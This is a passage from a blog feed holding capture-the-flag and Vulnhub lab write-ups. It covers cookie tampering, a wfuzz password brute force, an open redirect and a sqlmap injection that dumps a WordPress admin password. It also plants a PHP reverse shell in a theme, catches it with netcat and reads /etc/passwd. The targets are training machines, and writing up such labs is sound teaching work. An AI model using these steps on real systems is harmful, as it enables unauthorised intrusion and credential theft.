&lt;div class=&#34;highlight&#34; style=&#34;background: #272822&#34;&gt;&lt;pre style=&#34;line-height: 125%&#34;&gt;http://ctf.infosecinstitute.com/ctf2/exercises/ex8.php?attachment_id=1
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;So let me see if I can access an image via another ID, for example &lt;code&gt;id=4&lt;/code&gt;.
I get the message:&lt;/p&gt;

&lt;div class=&#34;highlight&#34; style=&#34;background: #272822&#34;&gt;&lt;pre style=&#34;line-height: 125%&#34;&gt;This attachment is currently under review by our editors. 
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;So no. Checking out the image URL for one of the chess images shows me that the images
are stored at &lt;code&gt;http://ctf.infosecinstitute.com/ctf2/ex8_assets/img/chess1.png&lt;/code&gt; for example.&lt;/p&gt;

&lt;p&gt;I make a note of this.&lt;/p&gt;

&lt;p&gt;Now can I just upload an html file? That gives me an error of an invalid file type. So let me chack
if it&amp;rsquo;s just checking the extension or if there&amp;rsquo;s something more happening. Intercepting the upload
request with Burp proxy I can change the extension to &lt;code&gt;jpg&lt;/code&gt; and sucessfully upload the html file.&lt;/p&gt;

&lt;p&gt;Now browsing to the image url I am told it cannot display the image due to errors. Well, the browser
is trying to interpret the file as an image, which it clearly isn&amp;rsquo;t. There&amp;rsquo;s got to be another way
to get at my image. How about the object reference in the URL &lt;code&gt;http://ctf.infosecinstitute.com/ctf2/exercises/ex8.php?attachment_id=1&lt;/code&gt;
for example? Maybe if I just reference the filename directly?&lt;/p&gt;

&lt;div class=&#34;highlight&#34; style=&#34;background: #272822&#34;&gt;&lt;pre style=&#34;line-height: 125%&#34;&gt;http://ctf.infosecinstitute.com/ctf2/exercises/ex8.php?file=index.jpg
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Success&lt;/p&gt;

&lt;p&gt;&lt;a href=&#34;http://i.imgur.com/RVoJGMr.png&#34;&gt;{ %img http://i.imgur.com/RVoJGMr.png %}&lt;/a&gt;&lt;/p&gt;

&lt;h1 id=&#34;level-09:ad4b2a18d89fa2f20e1d964dd8f70255&#34;&gt;Level 09&lt;/h1&gt;

&lt;p&gt;&lt;a href=&#34;http://ctf.infosecinstitute.com/ctf2/exercises/ex9.php&#34;&gt;Level 09&lt;/a&gt; starts off by showing me the
details of one John Doe.&lt;/p&gt;


&lt;figure &gt;
    
        &lt;img src=&#34;http://i.imgur.com/8NESmpB.png&#34; /&gt;
    
    
&lt;/figure&gt;


&lt;p&gt;I need to change something to make it show the details for Mary Jane. There&amp;rsquo;s no URL parms,
no login, so how can the page know who to show? There&amp;rsquo;s one place left: the cookie jar.&lt;/p&gt;

&lt;p&gt;Using Firebug once again I inspect the cookies and sure enough&lt;/p&gt;


&lt;figure &gt;
    
        &lt;img src=&#34;http://i.imgur.com/xGdtDa7.png&#34; /&gt;
    
    
&lt;/figure&gt;


&lt;p&gt;This is &amp;ldquo;JOHN+DOE&amp;rdquo; encoded as base64 as it turns out. One thing to note is when you&lt;/p&gt;

&lt;div class=&#34;highlight&#34; style=&#34;background: #272822&#34;&gt;&lt;pre style=&#34;line-height: 125%&#34;&gt;echo Sk9ITitET0u= | base64 -d
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;there is no newline at end of the name. So to encode &lt;code&gt;MARY+JANE&lt;/code&gt; correctly I need to
use echo with the &lt;code&gt;-n&lt;/code&gt; flag:&lt;/p&gt;

&lt;div class=&#34;highlight&#34; style=&#34;background: #272822&#34;&gt;&lt;pre style=&#34;line-height: 125%&#34;&gt;$&amp;gt; &lt;span style=&#34;color: #f8f8f2&#34;&gt;echo&lt;/span&gt; -n MARY+JANE &lt;span style=&#34;color: #f8f8f2&#34;&gt;|&lt;/span&gt; base64
TUFSWStKQU5F
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Editing the cookie and inserting that base64 string will show us Mary Jane&amp;rsquo;s details.&lt;/p&gt;

&lt;h1 id=&#34;level-10:ad4b2a18d89fa2f20e1d964dd8f70255&#34;&gt;Level 10&lt;/h1&gt;

&lt;p&gt;&lt;a href=&#34;http://ctf.infosecinstitute.com/ctf2/exercises/ex10.php&#34;&gt;Level 10&lt;/a&gt; is a game and we need to
edit its source so we look like we&amp;rsquo;re really good at it.&lt;/p&gt;


&lt;figure &gt;
    
        &lt;img src=&#34;http://i.imgur.com/g03njlQ.png&#34; /&gt;
    
    
&lt;/figure&gt;


&lt;p&gt;Entering anything in the name I field I have a poke around to see how the whole thing
works. We&amp;rsquo;re shown some coloured squares and then they are turn over. We need to then
remember which colour each square had. Except we need to do it at least 9999 times and
at the extreme level, which only shows us the squares for a second.&lt;/p&gt;

&lt;p&gt;Finding the square colours isn&amp;rsquo;t hard. With Firebug we can see:&lt;/p&gt;


&lt;figure &gt;
    
        &lt;img src=&#34;http://i.imgur.com/isDO7LM.png&#34; /&gt;
    
    
&lt;/figure&gt;


&lt;p&gt;and those numbers are 0 indexed into the list of numbers from the selction popup. So playing
along I can win one game. So let&amp;rsquo;s find out where my current win/loss count is stored.&lt;/p&gt;

&lt;p&gt;In the Javscript I find a structure that does this:&lt;/p&gt;


&lt;figure &gt;
    
        &lt;img src=&#34;http://i.imgur.com/gZghIIn.png&#34; /&gt;
    
    
&lt;/figure&gt;


&lt;p&gt;but all this does is increment and decrement the values. Clearly that data is stored somewhere.
Turns out that this &lt;code&gt;localstorage&lt;/code&gt; is in the DOM. Using the &lt;em&gt;DOM&lt;/em&gt; tab in Firebug I can find
the structure and its data:&lt;/p&gt;

&lt;p&gt;
&lt;figure &gt;
    
        &lt;img src=&#34;http://i.imgur.com/xGIZXpb.png&#34; /&gt;
    
    
&lt;/figure&gt;
&lt;/p&gt;

&lt;p&gt;Now I can edit the number of wins and then, all I need to do is play one more game to take the flag.&lt;/p&gt;

&lt;h1 id=&#34;level-11:ad4b2a18d89fa2f20e1d964dd8f70255&#34;&gt;Level 11&lt;/h1&gt;

&lt;p&gt;&lt;a href=&#34;http://ctf.infosecinstitute.com/ctf2/exercises/ex11.php&#34;&gt;Level 11&lt;/a&gt; blacklists me&lt;/p&gt;

&lt;p&gt;
&lt;figure &gt;
    
        &lt;img src=&#34;http://i.imgur.com/RaGy98O.png&#34; /&gt;
    
    
&lt;/figure&gt;
&lt;/p&gt;

&lt;p&gt;Awwwww I was having such fun. But how? Not from my IP, as that&amp;rsquo;s going to change. First thing
to check: cookie jar. Yay!&lt;/p&gt;

&lt;p&gt;
&lt;figure &gt;
    
        &lt;img src=&#34;http://i.imgur.com/QgGrvwE.png&#34; /&gt;
    
    
&lt;/figure&gt;
&lt;/p&gt;

&lt;p&gt;There it is, a big &lt;code&gt;no&lt;/code&gt;. I&amp;rsquo;ll change that to a &lt;code&gt;yes&lt;/code&gt;, reload and take the flag, thanks very much.&lt;/p&gt;

&lt;h1 id=&#34;level-12:ad4b2a18d89fa2f20e1d964dd8f70255&#34;&gt;Level 12&lt;/h1&gt;

&lt;p&gt;&lt;a href=&#34;http://ctf.infosecinstitute.com/ctf2/exercises/ex12.php&#34;&gt;Level 12&lt;/a&gt; is a bruteforce challange. No
login attempt limits, no rate limits, so it&amp;rsquo;s ripe for the picking.&lt;/p&gt;

&lt;p&gt;
&lt;figure &gt;
    
        &lt;img src=&#34;http://i.imgur.com/LMUBNoq.png&#34; /&gt;
    
    
&lt;/figure&gt;
&lt;/p&gt;

&lt;p&gt;After searching for the suggested password list, the first hit is the Openwall password list for
john the ripper. So why not download it and give it a try?&lt;/p&gt;

&lt;p&gt;I fire up &lt;code&gt;wfuzz&lt;/code&gt; with the following commandline&lt;/p&gt;

&lt;p&gt;&lt;div class=&#34;highlight&#34; style=&#34;background: #272822&#34;&gt;&lt;pre style=&#34;line-height: 125%&#34;&gt;$&amp;gt; wfuzz -c -z file,/usr/share/wordlists/password-2011.lst --hw Incorrect -d &lt;span style=&#34;color: #e6db74&#34;&gt;&amp;quot;username=admin&amp;amp;password=FUZZ&amp;amp;logIn=Login&amp;quot;&lt;/span&gt; &lt;span style=&#34;color: #e6db74&#34;&gt;&amp;quot;http://ctf.infosecinstitute.com/ctf2/exercises/ex12.php&amp;quot;&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;/p&gt;

&lt;p&gt;Within a few seconds I get a hit with &lt;code&gt;princess&lt;/code&gt;. Enter that with the username &lt;code&gt;admin&lt;/code&gt; and onto the next level&lt;/p&gt;

&lt;h1 id=&#34;level-13:ad4b2a18d89fa2f20e1d964dd8f70255&#34;&gt;Level 13&lt;/h1&gt;

&lt;p&gt;&lt;a href=&#34;http://ctf.infosecinstitute.com/ctf2/exercises/ex13.php?redirect=ex13-task.php&#34;&gt;Level 13&lt;/a&gt; is actually
redirect to &lt;code&gt;ex13-task.php&lt;/code&gt;. I need to make the redirect point to an external page so that to another user
it looks like they are visiting &lt;code&gt;ctf.infosecinstitute.com&lt;/code&gt; but are infact taken to another site&lt;/p&gt;

&lt;p&gt;
&lt;figure &gt;
    
        &lt;img src=&#34;http://i.imgur.com/jNgQ4Ww.png&#34; /&gt;
    
    
&lt;/figure&gt;
&lt;/p&gt;

&lt;p&gt;Well the obvious thing is just to try and type in another URL &lt;code&gt;http://ctf.infosecinstitute.com/ctf2/exercises/ex13.php?redirect=http://unlogic.co.uk&lt;/code&gt;
but that gives me an error. Hrmm&amp;hellip; trying a few other redirect options tells me that the redirect is URL
relative, which means if I strip off the protocol off the URL, I should be able to make this work:&lt;/p&gt;

&lt;p&gt;&lt;a href=&#34;http://i.imgur.com/QM7V8Dk.png&#34;&gt;
&lt;figure &gt;
    
        &lt;img src=&#34;http://i.imgur.com/QM7V8Dk.png&#34; /&gt;
    
    
&lt;/figure&gt;
&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;Sure enough, that worked. That&amp;rsquo;s it, the final flag.&lt;/p&gt;

&lt;p&gt;Thanks to the Infosec Institute for another great CTF!&lt;/p&gt;
</description>
    </item>
    
    <item>
      <title>Vulnhub&#39;s &#39;TopHatSec Freshly&#39;</title>
      <link>http://unlogic.co.uk/2015/04/11/vulnhubs-freshly/</link>
      <pubDate>Sat, 11 Apr 2015 00:00:00 +0000</pubDate>
      
      <guid>http://unlogic.co.uk/2015/04/11/vulnhubs-freshly/</guid>
      <description>&lt;p&gt;This is my first writeup of a &lt;a href=&#34;https://vulnhub.com&#34;&gt;Vulnhub&lt;/a&gt; wargame: Freshly.&lt;/p&gt;

&lt;p&gt;The challenge is:&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;The goal of this challenge is to break into the machine via 
the web and find the secret hidden in a sensitive file. 
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Go grab the image and follow along.&lt;/p&gt;

&lt;p&gt;First I need to determine the image&amp;rsquo;s IP address and what services it is running:&lt;/p&gt;

&lt;div class=&#34;highlight&#34; style=&#34;background: #272822&#34;&gt;&lt;pre style=&#34;line-height: 125%&#34;&gt;root@kali:~# nmap -sn 192.168.56.0/24

Starting Nmap 6.47 ( http://nmap.org ) at 2015-04-10 18:19 BST
Nmap scan report for 192.168.56.1
Host is up (0.00019s latency).
MAC Address: 0A:00:27:00:00:00 (Unknown)
Nmap scan report for 192.168.56.100
Host is up (0.00088s latency).
MAC Address: 08:00:27:F7:1C:75 (Cadmus Computer Systems)
Nmap scan report for 192.168.56.103
Host is up (0.00036s latency).
MAC Address: 08:00:27:F2:73:82 (Cadmus Computer Systems)
Nmap scan report for 192.168.56.102
Host is up.
Nmap done: 256 IP addresses (4 hosts up) scanned in 1.76 seconds
root@kali:~# nmap -p- 192.168.56.103

Starting Nmap 6.47 ( http://nmap.org ) at 2015-04-10 18:19 BST
Nmap scan report for 192.168.56.103
Host is up (0.00026s latency).
Not shown: 65532 closed ports
PORT     STATE SERVICE
80/tcp   open  http
443/tcp  open  https
8080/tcp open  http-proxy
MAC Address: 08:00:27:F2:73:82 (Cadmus Computer Systems)

Nmap done: 1 IP address (1 host up) scanned in 6.46 sconds
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;So I can see the host is at &lt;code&gt;192.168.56.103&lt;/code&gt; and has ports &lt;em&gt;80, 443, and 8080&lt;/em&gt;
open. Browsing to the address presents an animated gif.&lt;/p&gt;


&lt;figure &gt;
    
        &lt;img src=&#34;http://i.imgur.com/qgkgkgg.png&#34; /&gt;
    
    
&lt;/figure&gt;


&lt;p&gt;My initial reaction is
to look at the source, but here I only see the &lt;code&gt;&amp;lt;img&amp;gt;&lt;/code&gt; tag and the image filename.
The image filename could be useful later, but right now I see no use for it.&lt;/p&gt;

&lt;p&gt;In that case let&amp;rsquo;s see if the SSL port holds anything more interesting.&lt;/p&gt;


&lt;figure &gt;
    
        &lt;img src=&#34;http://i.imgur.com/wvHo8ru.png&#34; /&gt;
    
    
&lt;/figure&gt;


&lt;p&gt;Nice, looks like I&amp;rsquo;m getting somewhere. I follow this link to a wordpress site
which sells candy. Generally browsing the site I notice it&amp;rsquo;s a Bitnami install
of a Wordpress site, running a few plugins.&lt;/p&gt;


&lt;figure &gt;
    
        &lt;img src=&#34;http://i.imgur.com/SHEXup3.png&#34; /&gt;
    
    
&lt;/figure&gt;


&lt;p&gt;Before I start work on that, let me just see what&amp;rsquo;s at port &lt;em&gt;8080&lt;/em&gt;. Ah, it&amp;rsquo;s a
non &lt;em&gt;https&lt;/em&gt; version of the wordpress site. I&amp;rsquo;m going to use that instead
of the &lt;em&gt;https&lt;/em&gt; version to avoid any certificate issues and generally make life
a bit easier.&lt;/p&gt;

&lt;p&gt;Using &lt;code&gt;wpscan&lt;/code&gt; I can find out which of the installed plugins have vulnerabilities.&lt;/p&gt;

&lt;div class=&#34;highlight&#34; style=&#34;background: #272822&#34;&gt;&lt;pre style=&#34;line-height: 125%&#34;&gt;root@kali:~# wpscan -u http://192.168.56.103:8080/wordpress --enumerate vp
_______________________________________________________________
        __          _______   _____                  
        \ \        / /  __ \ / ____|                 
         \ \  /\  / /| |__) | (___   ___  __ _ _ __  
          \ \/  \/ / |  ___/ \___ \ / __|/ _` | &amp;#39;_ \ 
           \  /\  /  | |     ____) | (__| (_| | | | |
            \/  \/   |_|    |_____/ \___|\__,_|_| |_|

        WordPress Security Scanner by the WPScan Team 
                       Version 2.6
          Sponsored by Sucuri - https://sucuri.net
   @_WPScan_, @ethicalhack3r, @erwan_lr, pvdl, @_FireFart_
_______________________________________________________________

[+] URL: http://192.168.56.103:8080/wordpress/
[+] Started: Fri Apr 10 18:42:00 2015

[!] The WordPress &amp;#39;http://192.168.56.103:8080/wordpress/readme.html&amp;#39; file exists exposing a version number
[!] Full Path Disclosure (FPD) in: &amp;#39;http://192.168.56.103:8080/wordpress/wp-includes/rss-functions.php&amp;#39;
[+] Interesting header: SERVER: Apache
[+] Interesting header: X-FRAME-OPTIONS: SAMEORIGIN
[+] XML-RPC Interface available under: http://192.168.56.103:8080/wordpress/xmlrpc.php

[+] WordPress version 4.1 identified from meta generator

[+] Enumerating installed plugins (only vulnerable ones) ...

   Time: 00:01:40 &amp;lt;============================================&amp;gt; (952 / 952) 100.00% Time: 00:01:40

[+] We found 4 plugins:

[+] Name: cart66-lite - v1.5.3
 |  Location: http://192.168.56.103:8080/wordpress/wp-content/plugins/cart66-lite/
 |  Readme: http://192.168.56.103:8080/wordpress/wp-content/plugins/cart66-lite/readme.txt

[!] Title: Cart66 Lite &amp;lt;= 1.5.3 - SQL Injection
    Reference: https://wpvulndb.com/vulnerabilities/7737
    Reference: https://research.g0blin.co.uk/g0blin-00022/
    Reference: http://web.nvd.nist.gov/view/vuln/detail?vulnId=CVE-2014-9442
[i] Fixed in: 1.5.4

[+] Name: google-analytics-for-wordpress - v5.3.1
 |  Location: http://192.168.56.103:8080/wordpress/wp-content/plugins/google-analytics-for-wordpress/
 |  Readme: http://192.168.56.103:8080/wordpress/wp-content/plugins/google-analytics-for-wordpress/readme.txt

[!] Title: Google Analytics by Yoast 5.3.2 - Cross-Site Scripting (XSS)
    Reference: https://wpvulndb.com/vulnerabilities/7838
    Reference: http://packetstormsecurity.com/files/130716/
    Reference: http://osvdb.org/119334

[+] Name: proplayer - v4.7.9.1
 |  Location: http://192.168.56.103:8080/wordpress/wp-content/plugins/proplayer/
 |  Readme: http://192.168.56.103:8080/wordpress/wp-content/plugins/proplayer/readme.txt

[!] Title: ProPlayer 4.7.9.1 - SQL Injection
    Reference: https://wpvulndb.com/vulnerabilities/6912
    Reference: http://osvdb.org/93564
    Reference: http://www.exploit-db.com/exploits/25605/

[+] Name: wptouch - v3.6.6
 |  Location: http://192.168.56.103:8080/wordpress/wp-content/plugins/wptouch/
 |  Readme: http://192.168.56.103:8080/wordpress/wp-content/plugins/wptouch/readme.txt

[!] Title: WPtouch &amp;lt;= 3.6.6 - Unvalidated Open Redirect
    Reference: https://wpvulndb.com/vulnerabilities/7837
    Reference: https://wordpress.org/plugins/wptouch/changelog/
[i] Fixed in: 3.7

[+] Finished: Fri Apr 10 18:43:48 2015
[+] Memory used: 9.027 MB
[+] Elapsed time: 00:01:48
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;There&amp;rsquo;s a few there, so I&amp;rsquo;ll look at each on in turn to see how easy it is to
exploit, and what it might yield.&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;&lt;p&gt;Cart66 Lite &amp;lt;= 1.5.3 - SQL Injection&lt;/p&gt;

&lt;p&gt;This requires the user to be logged in, and seeing as I don&amp;rsquo;t have a login
I won&amp;rsquo;t get very far with this.&lt;/p&gt;&lt;/li&gt;

&lt;li&gt;&lt;p&gt;Google Analytics by Yoast 5.3.2 - Cross-Site Scripting (XSS) ###&lt;/p&gt;

&lt;p&gt;This requires admin access to the site, in order to configure the plugin.
Another dead end.&lt;/p&gt;&lt;/li&gt;

&lt;li&gt;&lt;p&gt;ProPlayer 4.7.9.1 - SQL Injection&lt;/p&gt;

&lt;p&gt;Not much luck with this. Although it doesn&amp;rsquo;t require a login, I wasn&amp;rsquo;t
successful with getting anything out of it.&lt;/p&gt;&lt;/li&gt;

&lt;li&gt;&lt;p&gt;WPtouch &amp;lt;= 3.6.6 - Unvalidated Open Redirect&lt;/p&gt;

&lt;p&gt;I doubt that an unvalidated redirect will be of much use here.&lt;/p&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;Ok, thinking cap back on&amp;hellip;. I need a different angle of attack.&lt;/p&gt;

&lt;p&gt;Revisiting the main wordpress site there is something a bit unusual.&lt;/p&gt;

&lt;p&gt;
&lt;figure &gt;
    
        &lt;img src=&#34;http://i.imgur.com/2ddRfdF.png&#34; /&gt;
    
    
&lt;/figure&gt;
&lt;/p&gt;

&lt;p&gt;Did I miss something? Did I get done by a Jedi mindtrick? Let&amp;rsquo;s see. I&amp;rsquo;ll
head back to the main site and try and find some other pages with &lt;em&gt;DirBuster&lt;/em&gt;.&lt;/p&gt;

&lt;p&gt;This is how I set it up&lt;/p&gt;

&lt;p&gt;
&lt;figure &gt;
    
        &lt;img src=&#34;http://i.imgur.com/auVPaoO.png&#34; /&gt;
    
    
&lt;/figure&gt;
&lt;/p&gt;

&lt;p&gt;Using this list I got lucky and received two interesting hits after short while&lt;/p&gt;

&lt;p&gt;
&lt;figure &gt;
    
        &lt;img src=&#34;http://i.imgur.com/l647X5u.png&#34; /&gt;
    
    
&lt;/figure&gt;
&lt;/p&gt;

&lt;p&gt;I&amp;rsquo;ve decided to hold back on on the &lt;code&gt;phpmyadmin&lt;/code&gt; and investigate the &lt;code&gt;login.php&lt;/code&gt;
first. This is what lies at the end of that URL&lt;/p&gt;

&lt;p&gt;
&lt;figure &gt;
    
        &lt;img src=&#34;http://i.imgur.com/c8aSx4n.png&#34; /&gt;
    
    
&lt;/figure&gt;
&lt;/p&gt;

&lt;p&gt;I could just start attacking this with various SQLi strings, but the
beauty of attacking a virtual machine is that I can use tools without the fear
of breaking someone else&amp;rsquo;s stuff. Roll out &lt;code&gt;sqlmap&lt;/code&gt; and let&amp;rsquo;s see what we can find:&lt;/p&gt;

&lt;p&gt;&lt;div class=&#34;highlight&#34; style=&#34;background: #272822&#34;&gt;&lt;pre style=&#34;line-height: 125%&#34;&gt;root@kali:~# sqlmap  -u &lt;span style=&#34;color: #e6db74&#34;&gt;&amp;quot;192.168.56.103/login.php&amp;quot;&lt;/span&gt; --data&lt;span style=&#34;color: #f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color: #e6db74&#34;&gt;&amp;quot;user=1&amp;amp;password=1&amp;amp;s=Submit&amp;quot;&lt;/span&gt;

&amp;lt;snip&amp;gt;

POST parameter &amp;#39;user&amp;#39; is vulnerable. Do you want to keep testing the others (if any)? [y/N] y

&amp;lt;snip&amp;gt;

POST parameter &amp;#39;password&amp;#39; is vulnerable. Do you want to keep testing the others (if any)? [y/N] y

&amp;lt;snip&amp;gt;

[12:17:03] [INFO] the back-end DBMS is MySQL
web server operating system: Linux Ubuntu
web application technology: Apache 2.4.7, PHP 5.5.9
back-end DBMS: MySQL 5.0.11
&lt;/pre&gt;&lt;/div&gt;
&lt;/p&gt;

&lt;p&gt;I&amp;rsquo;ve removed some of the output for clarity, but I can see
that there&amp;rsquo;s possibility of a blind SQL injection for both &lt;code&gt;user&lt;/code&gt; and
&lt;code&gt;password&lt;/code&gt; and that it&amp;rsquo;s a MySQL databse. Great.
We can carry on using &lt;code&gt;sqlmap&lt;/code&gt; to try and discover
what tables there are and if we can find any useful information.&lt;/p&gt;

&lt;p&gt;First I&amp;rsquo;ll get a list of databases on the system. This process takes a little while,
so when it asks &amp;ldquo;&lt;em&gt;do you want sqlmap to try to optimize value(s) for DBMS delay
responses (option &amp;lsquo;&amp;ndash;time-sec&amp;rsquo;)? [Y/n]&lt;/em&gt;&amp;rdquo; answer &lt;em&gt;YES&lt;/em&gt;. It will be done quicker.&lt;/p&gt;

&lt;p&gt;&lt;div class=&#34;highlight&#34; style=&#34;background: #272822&#34;&gt;&lt;pre style=&#34;line-height: 125%&#34;&gt;root@kali:~# sqlmap  -u &lt;span style=&#34;color: #e6db74&#34;&gt;&amp;quot;192.168.56.103/login.php&amp;quot;&lt;/span&gt; --data&lt;span style=&#34;color: #f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color: #e6db74&#34;&gt;&amp;quot;user=1&amp;amp;password=1&amp;amp;s=Submit&amp;quot;&lt;/span&gt; --dbms&lt;span style=&#34;color: #f92672&#34;&gt;=&lt;/span&gt;mysql --dbs

&amp;lt;snip&amp;gt;

[12:20:19] [INFO] fetching database names
[12:20:19] [INFO] fetching number of databases
[12:20:19] [INFO] retrieved: 7
[12:20:21] [INFO] retrieved: information_schema
[12:21:36] [INFO] retrieved: login
[12:21:59] [INFO] retrieved: mysql
[12:22:20] [INFO] retrieved: performance_schema
[12:23:33] [INFO] retrieved: phpmyadmin
[12:24:18] [INFO] retrieved: users
[12:24:43] [INFO] retrieved: wordpress8080
available databases [7]:
[*] information_schema
[*] login
[*] mysql
[*] performance_schema
[*] phpmyadmin
[*] users
[*] wordpress8080

[12:25:44] [INFO] fetched data logged to text files under &amp;#39;/root/.sqlmap/output/192.168.56.103&amp;#39;

[*] shutting down at 12:25:44
&lt;/pre&gt;&lt;/div&gt;
&lt;/p&gt;

&lt;p&gt;It found seven databases, amongst which is an interesting one: &lt;code&gt;wordpress8080&lt;/code&gt;.
This seems to be the wordpress database, so I can start attacking that and see
if I can get the &lt;em&gt;admin&lt;/em&gt; account. The &lt;code&gt;login&lt;/code&gt; and &lt;code&gt;users&lt;/code&gt; databases also look
interesting, so let&amp;rsquo;s take a look at those later. Additionally, if I can get
a login, especially an &lt;em&gt;admin&lt;/em&gt; one, I could try to exploit the plugins later on.
After all, it does say there are multiple ways into this VM.&lt;/p&gt;

&lt;p&gt;&lt;div class=&#34;highlight&#34; style=&#34;background: #272822&#34;&gt;&lt;pre style=&#34;line-height: 125%&#34;&gt;root@kali:~# sqlmap  -u &lt;span style=&#34;color: #e6db74&#34;&gt;&amp;quot;192.168.56.103/login.php&amp;quot;&lt;/span&gt; --data&lt;span style=&#34;color: #f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color: #e6db74&#34;&gt;&amp;quot;user=1&amp;amp;password=1&amp;amp;s=Submit&amp;quot;&lt;/span&gt; --dbms&lt;span style=&#34;color: #f92672&#34;&gt;=&lt;/span&gt;mysql --tables -D wordpress8080

&amp;lt;snip&amp;gt;

Database: wordpress8080
[1 table]
+-------+
| users |
+-------+

root@kali:~# sqlmap  -u &lt;span style=&#34;color: #e6db74&#34;&gt;&amp;quot;192.168.56.103/login.php&amp;quot;&lt;/span&gt; --data&lt;span style=&#34;color: #f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color: #e6db74&#34;&gt;&amp;quot;user=1&amp;amp;password=1&amp;amp;s=Submit&amp;quot;&lt;/span&gt; --dbms&lt;span style=&#34;color: #f92672&#34;&gt;=&lt;/span&gt;mysql --dump -T users -D wordpress8080

&amp;lt;snip&amp;gt;

Database: wordpress8080
Table: users
[1 entry]
+----------+---------------------+
| username | password            |
+----------+---------------------+
| admin    | SuperSecretPassword |
+----------+---------------------+
&lt;/pre&gt;&lt;/div&gt;
&lt;/p&gt;

&lt;p&gt;The admin password for the wordpress site, excellent. As for the other tables,
I didn&amp;rsquo;t find anything useful in them, so I won&amp;rsquo;t post the output here. In that case
I might aswell just login to the wordpress site now. Basically I have full control
of the wordpress site now, so what should I do? How does a PHP shell sound? Good?
Alright then&amp;hellip; &lt;code&gt;cd /usr/share/webshells/php&lt;/code&gt; and I&amp;rsquo;m going to use the
&lt;code&gt;php-reverse-shell.php&lt;/code&gt; and replace the site&amp;rsquo;s &lt;em&gt;404&lt;/em&gt; with that.&lt;/p&gt;

&lt;p&gt;To do that I need to edit the theme in the admin section, and just
paste in the contents. The I need to open a listening &lt;code&gt;netcat&lt;/code&gt; session and
browse to a non-existant page on the site.&lt;/p&gt;

&lt;p&gt;&lt;div class=&#34;highlight&#34; style=&#34;background: #272822&#34;&gt;&lt;pre style=&#34;line-height: 125%&#34;&gt;root@kali:/usr/share/webshells/php# nc -lvnp 1337
listening on [any] 1337 ...
connect to [192.168.56.102] from (UNKNOWN) [192.168.56.103] 43875
Linux Freshly 3.13.0-45-generic #74-Ubuntu SMP Tue Jan 13 19:37:48 UTC 2015 i686 i686 i686 GNU/Linux
 19:36:34 up  5:45,  0 users,  load average: 0.08, 0.03, 0.05
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=1(daemon) gid=1(daemon) groups=1(daemon)
/bin/sh: 0: can&amp;#39;t access tty; job control turned off
$ &lt;span style=&#34;color: #f8f8f2&#34;&gt;cd&lt;/span&gt; /etc 
$ cat passwd
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
libuuid:x:100:101::/var/lib/libuuid:
syslog:x:101:104::/home/syslog:/bin/false
messagebus:x:102:105::/var/run/dbus:/bin/false
user:x:1000:1000:user,,,:/home/user:/bin/bash
mysql:x:103:111:MySQL Server,,,:/nonexistent:/bin/false
candycane:x:1001:1001::/home/candycane:
# YOU STOLE MY SECRET FILE!
# &lt;span style=&#34;color: #f8f8f2&#34;&gt;SECRET&lt;/span&gt; &lt;span style=&#34;color: #f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color: #e6db74&#34;&gt;&amp;quot;NOBODY EVER GOES IN, AND NOBODY EVER COMES OUT!&amp;quot;&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;/p&gt;

&lt;p&gt;I had to poke around the file system a bit to find this, but &lt;code&gt;/etc/passwd&lt;/code&gt; is
usually a &lt;em&gt;go-to&lt;/em&gt; file if you get access to a system. Otherwise I&amp;rsquo;d still
be looking for the file now :)&lt;/p&gt;

&lt;p&gt;So that&amp;rsquo;s one way to do it.&lt;/p&gt;

&lt;p&gt;This seems to be the most direct route in. It might be worth exploring the
vulnerabilities on the plugins, but it&amp;rsquo;s late now, so I&amp;rsquo;ll save that for
another time.&lt;/p&gt;
</description>
    </item>
    
    <item>
      <title>Solving Infosec n00bsCTF</title>
      <link>http://unlogic.co.uk/2015/03/11/infosec-n00bsctf/</link>
      <pubDate>Wed, 11 Mar 2015 00:00:00 +0000</pubDate>
      
      <guid>http://unlogic.co.uk/2015/03/11/infosec-n00bsctf/</guid>
      <description>

&lt;p&gt;The InfoSec Institue is running a &lt;a href=&#34;http://ctf.infosecinstitute.com/index.php&#34;&gt;n00bsCTF&lt;/a&gt;,
and I can&amp;rsquo;t resist a CTF really. Plus this will be a nice warmup for Hackyeaster 2015.
So let&amp;rsquo;s jump on it and get some flags&amp;hellip;&lt;/p&gt;

&lt;p&gt;I haven&amp;rsquo;t managed to get all of them, but I will be updating this post when
